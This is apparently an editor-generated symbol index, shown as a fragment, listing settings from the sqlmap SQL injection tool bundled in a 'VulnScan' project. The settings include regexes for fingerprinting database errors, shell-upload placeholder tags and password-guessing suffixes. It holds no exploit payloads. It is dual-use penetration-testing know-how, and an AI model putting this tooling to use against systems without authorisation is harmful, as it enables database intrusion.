        "peekOfCode": "WINDOWS_RESERVED_NAMES = (\"CON\", \"PRN\", \"AUX\", \"NUL\", \"COM1\", \"COM2\", \"COM3\", \"COM4\", \"COM5\", \"COM6\", \"COM7\", \"COM8\", \"COM9\", \"LPT1\", \"LPT2\", \"LPT3\", \"LPT4\", \"LPT5\", \"LPT6\", \"LPT7\", \"LPT8\", \"LPT9\")\n# Items displayed in basic help (-h) output\nBASIC_HELP_ITEMS = (\n    \"url\",\n    \"googleDork\",\n    \"data\",\n    \"cookie\",\n    \"randomAgent\",\n    \"proxy\",\n    \"testParameter\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BASIC_HELP_ITEMS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BASIC_HELP_ITEMS = (\n    \"url\",\n    \"googleDork\",\n    \"data\",\n    \"cookie\",\n    \"randomAgent\",\n    \"proxy\",\n    \"testParameter\",\n    \"dbms\",\n    \"level\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SHELL_WRITABLE_DIR_TAG",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SHELL_WRITABLE_DIR_TAG = \"%WRITABLE_DIR%\"\nSHELL_RUNCMD_EXE_TAG = \"%RUNCMD_EXE%\"\n# String representation for NULL value\nNULL = \"NULL\"\n# String representation for blank ('') value\nBLANK = \"<blank>\"\n# String representation for current database\nCURRENT_DB = \"CD\"\n# String representation for current user\nCURRENT_USER = \"CU\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SHELL_RUNCMD_EXE_TAG",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SHELL_RUNCMD_EXE_TAG = \"%RUNCMD_EXE%\"\n# String representation for NULL value\nNULL = \"NULL\"\n# String representation for blank ('') value\nBLANK = \"<blank>\"\n# String representation for current database\nCURRENT_DB = \"CD\"\n# String representation for current user\nCURRENT_USER = \"CU\"\n# Name of SQLite file used for storing session data",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NULL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "NULL = \"NULL\"\n# String representation for blank ('') value\nBLANK = \"<blank>\"\n# String representation for current database\nCURRENT_DB = \"CD\"\n# String representation for current user\nCURRENT_USER = \"CU\"\n# Name of SQLite file used for storing session data\nSESSION_SQLITE_FILE = \"session.sqlite\"\n# Regular expressions used for finding file paths in error messages",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BLANK",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BLANK = \"<blank>\"\n# String representation for current database\nCURRENT_DB = \"CD\"\n# String representation for current user\nCURRENT_USER = \"CU\"\n# Name of SQLite file used for storing session data\nSESSION_SQLITE_FILE = \"session.sqlite\"\n# Regular expressions used for finding file paths in error messages\nFILE_PATH_REGEXES = (r\"<b>(?P<result>[^<>]+?)</b> on line \\d+\", r\"\\bin (?P<result>[^<>'\\\"]+?)['\\\"]? on line \\d+\", r\"(?:[>(\\[\\s])(?P<result>[A-Za-z]:[\\\\/][\\w. \\\\/-]*)\", r\"(?:[>(\\[\\s])(?P<result>/\\w[/\\w.~-]+)\", r\"\\bhref=['\\\"]file://(?P<result>/[^'\\\"]+)\", r\"\\bin <b>(?P<result>[^<]+): line \\d+\")\n# Regular expressions used for parsing error messages (--parse-errors)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CURRENT_DB",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CURRENT_DB = \"CD\"\n# String representation for current user\nCURRENT_USER = \"CU\"\n# Name of SQLite file used for storing session data\nSESSION_SQLITE_FILE = \"session.sqlite\"\n# Regular expressions used for finding file paths in error messages\nFILE_PATH_REGEXES = (r\"<b>(?P<result>[^<>]+?)</b> on line \\d+\", r\"\\bin (?P<result>[^<>'\\\"]+?)['\\\"]? on line \\d+\", r\"(?:[>(\\[\\s])(?P<result>[A-Za-z]:[\\\\/][\\w. \\\\/-]*)\", r\"(?:[>(\\[\\s])(?P<result>/\\w[/\\w.~-]+)\", r\"\\bhref=['\\\"]file://(?P<result>/[^'\\\"]+)\", r\"\\bin <b>(?P<result>[^<]+): line \\d+\")\n# Regular expressions used for parsing error messages (--parse-errors)\nERROR_PARSING_REGEXES = (\n    r\"\\[Microsoft\\]\\[ODBC SQL Server Driver\\]\\[SQL Server\\](?P<result>[^<]+)\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CURRENT_USER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CURRENT_USER = \"CU\"\n# Name of SQLite file used for storing session data\nSESSION_SQLITE_FILE = \"session.sqlite\"\n# Regular expressions used for finding file paths in error messages\nFILE_PATH_REGEXES = (r\"<b>(?P<result>[^<>]+?)</b> on line \\d+\", r\"\\bin (?P<result>[^<>'\\\"]+?)['\\\"]? on line \\d+\", r\"(?:[>(\\[\\s])(?P<result>[A-Za-z]:[\\\\/][\\w. \\\\/-]*)\", r\"(?:[>(\\[\\s])(?P<result>/\\w[/\\w.~-]+)\", r\"\\bhref=['\\\"]file://(?P<result>/[^'\\\"]+)\", r\"\\bin <b>(?P<result>[^<]+): line \\d+\")\n# Regular expressions used for parsing error messages (--parse-errors)\nERROR_PARSING_REGEXES = (\n    r\"\\[Microsoft\\]\\[ODBC SQL Server Driver\\]\\[SQL Server\\](?P<result>[^<]+)\",\n    r\"<b>[^<]{0,100}(fatal|error|warning|exception)[^<]*</b>:?\\s*(?P<result>[^<]+)\",\n    r\"(?m)^\\s{0,100}(fatal|error|warning|exception):?\\s*(?P<result>[^\\n]+?)$\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SESSION_SQLITE_FILE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SESSION_SQLITE_FILE = \"session.sqlite\"\n# Regular expressions used for finding file paths in error messages\nFILE_PATH_REGEXES = (r\"<b>(?P<result>[^<>]+?)</b> on line \\d+\", r\"\\bin (?P<result>[^<>'\\\"]+?)['\\\"]? on line \\d+\", r\"(?:[>(\\[\\s])(?P<result>[A-Za-z]:[\\\\/][\\w. \\\\/-]*)\", r\"(?:[>(\\[\\s])(?P<result>/\\w[/\\w.~-]+)\", r\"\\bhref=['\\\"]file://(?P<result>/[^'\\\"]+)\", r\"\\bin <b>(?P<result>[^<]+): line \\d+\")\n# Regular expressions used for parsing error messages (--parse-errors)\nERROR_PARSING_REGEXES = (\n    r\"\\[Microsoft\\]\\[ODBC SQL Server Driver\\]\\[SQL Server\\](?P<result>[^<]+)\",\n    r\"<b>[^<]{0,100}(fatal|error|warning|exception)[^<]*</b>:?\\s*(?P<result>[^<]+)\",\n    r\"(?m)^\\s{0,100}(fatal|error|warning|exception):?\\s*(?P<result>[^\\n]+?)$\",\n    r\"(sql|dbc)[^>'\\\"]{0,32}(fatal|error|warning|exception)(</b>)?:\\s*(?P<result>[^<>]+)\",\n    r\"(?P<result>[^\\n>]{0,100}SQL Syntax[^\\n<]+)\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FILE_PATH_REGEXES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "FILE_PATH_REGEXES = (r\"<b>(?P<result>[^<>]+?)</b> on line \\d+\", r\"\\bin (?P<result>[^<>'\\\"]+?)['\\\"]? on line \\d+\", r\"(?:[>(\\[\\s])(?P<result>[A-Za-z]:[\\\\/][\\w. \\\\/-]*)\", r\"(?:[>(\\[\\s])(?P<result>/\\w[/\\w.~-]+)\", r\"\\bhref=['\\\"]file://(?P<result>/[^'\\\"]+)\", r\"\\bin <b>(?P<result>[^<]+): line \\d+\")\n# Regular expressions used for parsing error messages (--parse-errors)\nERROR_PARSING_REGEXES = (\n    r\"\\[Microsoft\\]\\[ODBC SQL Server Driver\\]\\[SQL Server\\](?P<result>[^<]+)\",\n    r\"<b>[^<]{0,100}(fatal|error|warning|exception)[^<]*</b>:?\\s*(?P<result>[^<]+)\",\n    r\"(?m)^\\s{0,100}(fatal|error|warning|exception):?\\s*(?P<result>[^\\n]+?)$\",\n    r\"(sql|dbc)[^>'\\\"]{0,32}(fatal|error|warning|exception)(</b>)?:\\s*(?P<result>[^<>]+)\",\n    r\"(?P<result>[^\\n>]{0,100}SQL Syntax[^\\n<]+)\",\n    r\"(?s)<li>Error Type:<br>(?P<result>.+?)</li>\",\n    r\"CDbCommand (?P<result>[^<>\\n]*SQL[^<>\\n]+)\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ERROR_PARSING_REGEXES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ERROR_PARSING_REGEXES = (\n    r\"\\[Microsoft\\]\\[ODBC SQL Server Driver\\]\\[SQL Server\\](?P<result>[^<]+)\",\n    r\"<b>[^<]{0,100}(fatal|error|warning|exception)[^<]*</b>:?\\s*(?P<result>[^<]+)\",\n    r\"(?m)^\\s{0,100}(fatal|error|warning|exception):?\\s*(?P<result>[^\\n]+?)$\",\n    r\"(sql|dbc)[^>'\\\"]{0,32}(fatal|error|warning|exception)(</b>)?:\\s*(?P<result>[^<>]+)\",\n    r\"(?P<result>[^\\n>]{0,100}SQL Syntax[^\\n<]+)\",\n    r\"(?s)<li>Error Type:<br>(?P<result>.+?)</li>\",\n    r\"CDbCommand (?P<result>[^<>\\n]*SQL[^<>\\n]+)\",\n    r\"error '[0-9a-f]{8}'((<[^>]+>)|\\s)+(?P<result>[^<>]+)\",\n    r\"\\[[^\\n\\]]{1,100}(ODBC|JDBC)[^\\n\\]]+\\](\\[[^\\]]+\\])?(?P<result>[^\\n]+(in query expression|\\(SQL| at /[^ ]+pdo)[^\\n<]+)\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "META_CHARSET_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "META_CHARSET_REGEX = r'(?si)<head>.*<meta[^>]+charset=\"?(?P<result>[^\"> ]+).*</head>'\n# Regular expression used for parsing refresh info from meta html headers\nMETA_REFRESH_REGEX = r'(?i)<meta http-equiv=\"?refresh\"?[^>]+content=\"?[^\">]+;\\s*(url=)?[\"\\']?(?P<result>[^\\'\">]+)'\n# Regular expression used for parsing Javascript redirect request\nJAVASCRIPT_HREF_REGEX = r'<script>\\s*(\\w+\\.)?location\\.href\\s*=[\"\\'](?P<result>[^\"\\']+)'\n# Regular expression used for parsing empty fields in tested form data\nEMPTY_FORM_FIELDS_REGEX = r'(&|\\A)(?P<result>[^=]+=(&|\\Z))'\n# Reference: http://www.cs.ru.nl/bachelorscripties/2010/Martin_Devillers___0437999___Analyzing_password_strength.pdf\nCOMMON_PASSWORD_SUFFIXES = (\"1\", \"123\", \"2\", \"12\", \"3\", \"13\", \"7\", \"11\", \"5\", \"22\", \"23\", \"01\", \"4\", \"07\", \"21\", \"14\", \"10\", \"06\", \"08\", \"8\", \"15\", \"69\", \"16\", \"6\", \"18\")\n# Reference: http://www.the-interweb.com/serendipity/index.php?/archives/94-A-brief-analysis-of-40,000-leaked-MySpace-passwords.html",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "META_REFRESH_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "META_REFRESH_REGEX = r'(?i)<meta http-equiv=\"?refresh\"?[^>]+content=\"?[^\">]+;\\s*(url=)?[\"\\']?(?P<result>[^\\'\">]+)'\n# Regular expression used for parsing Javascript redirect request\nJAVASCRIPT_HREF_REGEX = r'<script>\\s*(\\w+\\.)?location\\.href\\s*=[\"\\'](?P<result>[^\"\\']+)'\n# Regular expression used for parsing empty fields in tested form data\nEMPTY_FORM_FIELDS_REGEX = r'(&|\\A)(?P<result>[^=]+=(&|\\Z))'\n# Reference: http://www.cs.ru.nl/bachelorscripties/2010/Martin_Devillers___0437999___Analyzing_password_strength.pdf\nCOMMON_PASSWORD_SUFFIXES = (\"1\", \"123\", \"2\", \"12\", \"3\", \"13\", \"7\", \"11\", \"5\", \"22\", \"23\", \"01\", \"4\", \"07\", \"21\", \"14\", \"10\", \"06\", \"08\", \"8\", \"15\", \"69\", \"16\", \"6\", \"18\")\n# Reference: http://www.the-interweb.com/serendipity/index.php?/archives/94-A-brief-analysis-of-40,000-leaked-MySpace-passwords.html\nCOMMON_PASSWORD_SUFFIXES += (\"!\", \".\", \"*\", \"!!\", \"?\", \";\", \"..\", \"!!!\", \", \", \"@\")\n# Splitter used between requests in WebScarab log files",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "JAVASCRIPT_HREF_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "JAVASCRIPT_HREF_REGEX = r'<script>\\s*(\\w+\\.)?location\\.href\\s*=[\"\\'](?P<result>[^\"\\']+)'\n# Regular expression used for parsing empty fields in tested form data\nEMPTY_FORM_FIELDS_REGEX = r'(&|\\A)(?P<result>[^=]+=(&|\\Z))'\n# Reference: http://www.cs.ru.nl/bachelorscripties/2010/Martin_Devillers___0437999___Analyzing_password_strength.pdf\nCOMMON_PASSWORD_SUFFIXES = (\"1\", \"123\", \"2\", \"12\", \"3\", \"13\", \"7\", \"11\", \"5\", \"22\", \"23\", \"01\", \"4\", \"07\", \"21\", \"14\", \"10\", \"06\", \"08\", \"8\", \"15\", \"69\", \"16\", \"6\", \"18\")\n# Reference: http://www.the-interweb.com/serendipity/index.php?/archives/94-A-brief-analysis-of-40,000-leaked-MySpace-passwords.html\nCOMMON_PASSWORD_SUFFIXES += (\"!\", \".\", \"*\", \"!!\", \"?\", \";\", \"..\", \"!!!\", \", \", \"@\")\n# Splitter used between requests in WebScarab log files\nWEBSCARAB_SPLITTER = \"### Conversation\"\n# Splitter used between requests in BURP log files",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EMPTY_FORM_FIELDS_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "EMPTY_FORM_FIELDS_REGEX = r'(&|\\A)(?P<result>[^=]+=(&|\\Z))'\n# Reference: http://www.cs.ru.nl/bachelorscripties/2010/Martin_Devillers___0437999___Analyzing_password_strength.pdf\nCOMMON_PASSWORD_SUFFIXES = (\"1\", \"123\", \"2\", \"12\", \"3\", \"13\", \"7\", \"11\", \"5\", \"22\", \"23\", \"01\", \"4\", \"07\", \"21\", \"14\", \"10\", \"06\", \"08\", \"8\", \"15\", \"69\", \"16\", \"6\", \"18\")\n# Reference: http://www.the-interweb.com/serendipity/index.php?/archives/94-A-brief-analysis-of-40,000-leaked-MySpace-passwords.html\nCOMMON_PASSWORD_SUFFIXES += (\"!\", \".\", \"*\", \"!!\", \"?\", \";\", \"..\", \"!!!\", \", \", \"@\")\n# Splitter used between requests in WebScarab log files\nWEBSCARAB_SPLITTER = \"### Conversation\"\n# Splitter used between requests in BURP log files\nBURP_REQUEST_REGEX = r\"={10,}\\s+([A-Z]{3,} .+?)\\s+={10,}\"\n# Regex used for parsing XML Burp saved history items",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "COMMON_PASSWORD_SUFFIXES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "COMMON_PASSWORD_SUFFIXES = (\"1\", \"123\", \"2\", \"12\", \"3\", \"13\", \"7\", \"11\", \"5\", \"22\", \"23\", \"01\", \"4\", \"07\", \"21\", \"14\", \"10\", \"06\", \"08\", \"8\", \"15\", \"69\", \"16\", \"6\", \"18\")\n# Reference: http://www.the-interweb.com/serendipity/index.php?/archives/94-A-brief-analysis-of-40,000-leaked-MySpace-passwords.html\nCOMMON_PASSWORD_SUFFIXES += (\"!\", \".\", \"*\", \"!!\", \"?\", \";\", \"..\", \"!!!\", \", \", \"@\")\n# Splitter used between requests in WebScarab log files\nWEBSCARAB_SPLITTER = \"### Conversation\"\n# Splitter used between requests in BURP log files\nBURP_REQUEST_REGEX = r\"={10,}\\s+([A-Z]{3,} .+?)\\s+={10,}\"\n# Regex used for parsing XML Burp saved history items\nBURP_XML_HISTORY_REGEX = r'<port>(\\d+)</port>.*?<request base64=\"true\"><!\\[CDATA\\[([^]]+)'\n# Encoding used for Unicode data",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "WEBSCARAB_SPLITTER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "WEBSCARAB_SPLITTER = \"### Conversation\"\n# Splitter used between requests in BURP log files\nBURP_REQUEST_REGEX = r\"={10,}\\s+([A-Z]{3,} .+?)\\s+={10,}\"\n# Regex used for parsing XML Burp saved history items\nBURP_XML_HISTORY_REGEX = r'<port>(\\d+)</port>.*?<request base64=\"true\"><!\\[CDATA\\[([^]]+)'\n# Encoding used for Unicode data\nUNICODE_ENCODING = \"utf8\"\n# Reference: http://www.w3.org/Protocols/HTTP/Object_Headers.html#uri\nURI_HTTP_HEADER = \"URI\"\n# Uri format which could be injectable (e.g. www.site.com/id82)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BURP_REQUEST_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BURP_REQUEST_REGEX = r\"={10,}\\s+([A-Z]{3,} .+?)\\s+={10,}\"\n# Regex used for parsing XML Burp saved history items\nBURP_XML_HISTORY_REGEX = r'<port>(\\d+)</port>.*?<request base64=\"true\"><!\\[CDATA\\[([^]]+)'\n# Encoding used for Unicode data\nUNICODE_ENCODING = \"utf8\"\n# Reference: http://www.w3.org/Protocols/HTTP/Object_Headers.html#uri\nURI_HTTP_HEADER = \"URI\"\n# Uri format which could be injectable (e.g. www.site.com/id82)\nURI_INJECTABLE_REGEX = r\"//[^/]*/([^\\.*?]+)\\Z\"\n# Regex used for masking sensitive data",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BURP_XML_HISTORY_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BURP_XML_HISTORY_REGEX = r'<port>(\\d+)</port>.*?<request base64=\"true\"><!\\[CDATA\\[([^]]+)'\n# Encoding used for Unicode data\nUNICODE_ENCODING = \"utf8\"\n# Reference: http://www.w3.org/Protocols/HTTP/Object_Headers.html#uri\nURI_HTTP_HEADER = \"URI\"\n# Uri format which could be injectable (e.g. www.site.com/id82)\nURI_INJECTABLE_REGEX = r\"//[^/]*/([^\\.*?]+)\\Z\"\n# Regex used for masking sensitive data\nSENSITIVE_DATA_REGEX = r\"(\\s|=)(?P<result>[^\\s=]*\\b%s\\b[^\\s]*)\\s\"\n# Options to explicitly mask in anonymous (unhandled exception) reports (along with anything carrying the <hostname> inside)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNICODE_ENCODING",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "UNICODE_ENCODING = \"utf8\"\n# Reference: http://www.w3.org/Protocols/HTTP/Object_Headers.html#uri\nURI_HTTP_HEADER = \"URI\"\n# Uri format which could be injectable (e.g. www.site.com/id82)\nURI_INJECTABLE_REGEX = r\"//[^/]*/([^\\.*?]+)\\Z\"\n# Regex used for masking sensitive data\nSENSITIVE_DATA_REGEX = r\"(\\s|=)(?P<result>[^\\s=]*\\b%s\\b[^\\s]*)\\s\"\n# Options to explicitly mask in anonymous (unhandled exception) reports (along with anything carrying the <hostname> inside)\nSENSITIVE_OPTIONS = (\"hostname\", \"answers\", \"data\", \"dnsDomain\", \"googleDork\", \"authCred\", \"proxyCred\", \"tbl\", \"db\", \"col\", \"user\", \"cookie\", \"proxy\", \"fileRead\", \"fileWrite\", \"fileDest\", \"testParameter\", \"authCred\", \"sqlQuery\", \"requestFile\")\n# Maximum number of threads (avoiding connection issues and/or DoS)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URI_HTTP_HEADER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "URI_HTTP_HEADER = \"URI\"\n# Uri format which could be injectable (e.g. www.site.com/id82)\nURI_INJECTABLE_REGEX = r\"//[^/]*/([^\\.*?]+)\\Z\"\n# Regex used for masking sensitive data\nSENSITIVE_DATA_REGEX = r\"(\\s|=)(?P<result>[^\\s=]*\\b%s\\b[^\\s]*)\\s\"\n# Options to explicitly mask in anonymous (unhandled exception) reports (along with anything carrying the <hostname> inside)\nSENSITIVE_OPTIONS = (\"hostname\", \"answers\", \"data\", \"dnsDomain\", \"googleDork\", \"authCred\", \"proxyCred\", \"tbl\", \"db\", \"col\", \"user\", \"cookie\", \"proxy\", \"fileRead\", \"fileWrite\", \"fileDest\", \"testParameter\", \"authCred\", \"sqlQuery\", \"requestFile\")\n# Maximum number of threads (avoiding connection issues and/or DoS)\nMAX_NUMBER_OF_THREADS = 10\n# Minimum range between minimum and maximum of statistical set",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URI_INJECTABLE_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "URI_INJECTABLE_REGEX = r\"//[^/]*/([^\\.*?]+)\\Z\"\n# Regex used for masking sensitive data\nSENSITIVE_DATA_REGEX = r\"(\\s|=)(?P<result>[^\\s=]*\\b%s\\b[^\\s]*)\\s\"\n# Options to explicitly mask in anonymous (unhandled exception) reports (along with anything carrying the <hostname> inside)\nSENSITIVE_OPTIONS = (\"hostname\", \"answers\", \"data\", \"dnsDomain\", \"googleDork\", \"authCred\", \"proxyCred\", \"tbl\", \"db\", \"col\", \"user\", \"cookie\", \"proxy\", \"fileRead\", \"fileWrite\", \"fileDest\", \"testParameter\", \"authCred\", \"sqlQuery\", \"requestFile\")\n# Maximum number of threads (avoiding connection issues and/or DoS)\nMAX_NUMBER_OF_THREADS = 10\n# Minimum range between minimum and maximum of statistical set\nMIN_STATISTICAL_RANGE = 0.01\n# Minimum value for comparison ratio",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SENSITIVE_DATA_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SENSITIVE_DATA_REGEX = r\"(\\s|=)(?P<result>[^\\s=]*\\b%s\\b[^\\s]*)\\s\"\n# Options to explicitly mask in anonymous (unhandled exception) reports (along with anything carrying the <hostname> inside)\nSENSITIVE_OPTIONS = (\"hostname\", \"answers\", \"data\", \"dnsDomain\", \"googleDork\", \"authCred\", \"proxyCred\", \"tbl\", \"db\", \"col\", \"user\", \"cookie\", \"proxy\", \"fileRead\", \"fileWrite\", \"fileDest\", \"testParameter\", \"authCred\", \"sqlQuery\", \"requestFile\")\n# Maximum number of threads (avoiding connection issues and/or DoS)\nMAX_NUMBER_OF_THREADS = 10\n# Minimum range between minimum and maximum of statistical set\nMIN_STATISTICAL_RANGE = 0.01\n# Minimum value for comparison ratio\nMIN_RATIO = 0.0\n# Maximum value for comparison ratio",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SENSITIVE_OPTIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SENSITIVE_OPTIONS = (\"hostname\", \"answers\", \"data\", \"dnsDomain\", \"googleDork\", \"authCred\", \"proxyCred\", \"tbl\", \"db\", \"col\", \"user\", \"cookie\", \"proxy\", \"fileRead\", \"fileWrite\", \"fileDest\", \"testParameter\", \"authCred\", \"sqlQuery\", \"requestFile\")\n# Maximum number of threads (avoiding connection issues and/or DoS)\nMAX_NUMBER_OF_THREADS = 10\n# Minimum range between minimum and maximum of statistical set\nMIN_STATISTICAL_RANGE = 0.01\n# Minimum value for comparison ratio\nMIN_RATIO = 0.0\n# Maximum value for comparison ratio\nMAX_RATIO = 1.0\n# Minimum length of sentence for automatic choosing of --string (in case of high matching ratio)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_NUMBER_OF_THREADS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_NUMBER_OF_THREADS = 10\n# Minimum range between minimum and maximum of statistical set\nMIN_STATISTICAL_RANGE = 0.01\n# Minimum value for comparison ratio\nMIN_RATIO = 0.0\n# Maximum value for comparison ratio\nMAX_RATIO = 1.0\n# Minimum length of sentence for automatic choosing of --string (in case of high matching ratio)\nCANDIDATE_SENTENCE_MIN_LENGTH = 10\n# Character used for marking injectable position inside provided data",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_STATISTICAL_RANGE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MIN_STATISTICAL_RANGE = 0.01\n# Minimum value for comparison ratio\nMIN_RATIO = 0.0\n# Maximum value for comparison ratio\nMAX_RATIO = 1.0\n# Minimum length of sentence for automatic choosing of --string (in case of high matching ratio)\nCANDIDATE_SENTENCE_MIN_LENGTH = 10\n# Character used for marking injectable position inside provided data\nCUSTOM_INJECTION_MARK_CHAR = '*'\n# Wildcard value that can be used in option --ignore-code",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_RATIO",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MIN_RATIO = 0.0\n# Maximum value for comparison ratio\nMAX_RATIO = 1.0\n# Minimum length of sentence for automatic choosing of --string (in case of high matching ratio)\nCANDIDATE_SENTENCE_MIN_LENGTH = 10\n# Character used for marking injectable position inside provided data\nCUSTOM_INJECTION_MARK_CHAR = '*'\n# Wildcard value that can be used in option --ignore-code\nIGNORE_CODE_WILDCARD = '*'\n# Other way to declare injection position",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_RATIO",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_RATIO = 1.0\n# Minimum length of sentence for automatic choosing of --string (in case of high matching ratio)\nCANDIDATE_SENTENCE_MIN_LENGTH = 10\n# Character used for marking injectable position inside provided data\nCUSTOM_INJECTION_MARK_CHAR = '*'\n# Wildcard value that can be used in option --ignore-code\nIGNORE_CODE_WILDCARD = '*'\n# Other way to declare injection position\nINJECT_HERE_REGEX = r\"(?i)%INJECT[_ ]?HERE%\"\n# Minimum chunk length used for retrieving data over error based payloads",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CANDIDATE_SENTENCE_MIN_LENGTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
